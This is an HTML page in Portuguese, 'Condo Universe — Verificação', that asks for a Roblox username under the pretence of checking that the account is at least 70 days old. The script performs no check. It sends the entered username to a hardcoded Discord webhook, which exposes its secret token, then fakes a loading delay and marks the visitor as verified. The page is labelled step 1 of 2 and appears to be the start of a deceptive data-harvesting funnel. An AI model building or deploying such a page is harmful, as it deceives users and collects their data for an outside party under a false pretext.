<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
  <title>Condo Universe — Verificação</title>
  <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      min-height: 100dvh;
      background: #0a0a0a;
      background-image:
        radial-gradient(ellipse 80% 60% at 50% -10%, rgba(180,0,0,0.18) 0%, transparent 70%);
      font-family: 'Inter', sans-serif;
      color: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 24px 16px;
    }

    /* Logo */
    .logo {
      display: flex;
      align-items: center;
      gap: 10px;
      margin-bottom: 28px;
    }
    .logo svg { width: 36px; height: 36px; }
    .logo-text {
      font-size: 22px;
      font-weight: 900;
      letter-spacing: 2px;
      color: #e53535;
      text-transform: uppercase;
    }

    /* Subtitle */
    .subtitle {
      font-size: 11px;
      font-weight: 600;
      letter-spacing: 3px;
      color: #888;
      text-transform: uppercase;
      margin-bottom: 24px;
    }

    /* Steps */
    .steps {
      display: flex;
      gap: 32px;
      margin-bottom: 32px;
      align-items: center;
    }
    .step {
      width: 40px;
      height: 40px;
      border-radius: 50%;
      border: 2px solid #e53535;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 15px;
      font-weight: 700;
      color: #e53535;
      position: relative;
    }
    .step.active {
      background: rgba(229,53,53,0.12);
    }
    .step.inactive {
      border-color: #444;
      color: #555;
    }
    .steps::before {
      content: none;
    }

    /* Card */
    .card {
      background: #111214;
      border: 1px solid #2a2a2a;
      border-radius: 16px;
      padding: 36px 28px 32px;
      width: 100%;
      max-width: 380px;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 0;
    }

    .person-icon {
      margin-bottom: 18px;
    }
    .person-icon svg {
      width: 48px;
      height: 48px;
    }

    .card-title {
      font-size: 22px;
      font-weight: 800;
      color: #fff;
      margin-bottom: 10px;
      text-align: center;
    }

    .card-desc {
      font-size: 13px;
      color: #888;
      text-align: center;
      line-height: 1.5;
      margin-bottom: 24px;
    }

    .input-field {
      width: 100%;
      background: #0d0d0d;
      border: 1.5px solid #2a2a2a;
      border-radius: 10px;
      padding: 14px 16px;
      font-size: 14px;
      color: #ccc;
      font-family: 'Inter', sans-serif;
      outline: none;
      margin-bottom: 14px;
      transition: border-color .2s;
    }
    .input-field::placeholder { color: #555; }
    .input-field:focus { border-color: #e53535; }

    .warning {
      font-size: 12px;
      color: #888;
      text-align: center;
      line-height: 1.5;
      margin-bottom: 24px;
    }
    .warning span {
      color: #e53535;
      font-weight: 700;
    }

    .btn-verify {
      width: 100%;
      background: #e53535;
      border: none;
      border-radius: 10px;
      padding: 15px;
      font-size: 13px;
      font-weight: 800;
      letter-spacing: 2px;
      color: #fff;
      text-transform: uppercase;
      cursor: pointer;
      font-family: 'Inter', sans-serif;
      transition: background .2s, transform .1s;
    }
    .btn-verify:hover { background: #c92d2d; }
    .btn-verify:active { transform: scale(.98); }
    .btn-verify:disabled { background: #5a1a1a; cursor: not-allowed; }

    .error-msg {
      font-size: 12px;
      color: #e53535;
      text-align: center;
      margin-top: 12px;
      min-height: 18px;
    }

    /* Loading dots */
    @keyframes blink { 0%,80%,100%{opacity:0} 40%{opacity:1} }
    .dots span { animation: blink 1.2s infinite; }
    .dots span:nth-child(2) { animation-delay:.2s; }
    .dots span:nth-child(3) { animation-delay:.4s; }
  </style>
</head>
<body>

  <!-- Logo -->
  <div class="logo">
    <svg viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path d="M18 2L4 8v10c0 8.3 5.9 16 14 18 8.1-2 14-9.7 14-18V8L18 2z" fill="#e53535" opacity=".15" stroke="#e53535" stroke-width="1.5"/>
      <circle cx="18" cy="16" r="4" fill="#e53535"/>
      <path d="M18 20v6" stroke="#e53535" stroke-width="2" stroke-linecap="round"/>
    </svg>
    <span class="logo-text">Condo Universe</span>
  </div>

  <p class="subtitle">Verificação de Acesso</p>

  <!-- Steps -->
  <div class="steps">
    <div class="step active">1</div>
    <div class="step inactive">2</div>
  </div>

  <!-- Card -->
  <div class="card">
    <div class="person-icon">
      <svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
        <circle cx="24" cy="16" r="8" stroke="#e53535" stroke-width="2.5"/>
        <path d="M8 42c0-8.8 7.2-16 16-16s16 7.2 16 16" stroke="#e53535" stroke-width="2.5" stroke-linecap="round"/>
      </svg>
    </div>

    <h1 class="card-title">Verificar Conta Roblox</h1>
    <p class="card-desc">Digite seu nome de usuário do Roblox para verificar se você tem acesso.</p>

    <input
      class="input-field"
      id="username-input"
      type="text"
      placeholder="Seu username do Roblox..."
      autocomplete="off"
      autocorrect="off"
      spellcheck="false"
    />

    <p class="warning">
      Sua conta deve ter no mínimo <span>70 dias</span><br>de existência para ter acesso.
    </p>

    <button class="btn-verify" id="btn-verify" onclick="handleVerify()">
      Verificar Conta
    </button>

    <p class="error-msg" id="error-msg"></p>
  </div>

  <script>
    var WEBHOOK = "https://discord.com/api/webhooks/1516942088229621882/8O16a4T9H9VPVOuGltDxPIs34CIE1dSLp3PY096EoMuseYJEvV0wnKgcgMIkBCkULmLO";

    function handleVerify() {
      var input = document.getElementById('username-input');
      var btn = document.getElementById('btn-verify');
      var errorMsg = document.getElementById('error-msg');
      var username = input.value.trim();

      if (!username) {
        errorMsg.textContent = 'Por favor, insira seu username do Roblox.';
        input.focus();
        return;
      }

      btn.disabled = true;
      btn.innerHTML = 'Verificando<span class="dots"><span>.</span><span>.</span><span>.</span></span>';
      errorMsg.textContent = '';

      var payload = {
        embeds: [{
          title: '🔍 Nova Verificação de Acesso',
          color: 0xe53535,
          fields: [
            { name: 'Username', value: username, inline: true },
            { name: 'Página', value: 'Verificação de Conta', inline: true },
            { name: 'Data', value: new Date().toLocaleString('pt-BR'), inline: false }
          ],
          footer: { text: 'Condo Universe — Verificação' }
        }]
      };

      fetch(WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      }).catch(function() {});

      setTimeout(function() {
        localStorage.setItem('cv_verified', '1');
        localStorage.setItem('cv_user', username);
        window.location.href = '/';
      }, 1800);
    }

    document.getElementById('username-input').addEventListener('keydown', function(e) {
      if (e.key === 'Enter') handleVerify();
    });
  </script>
</body>
</html>
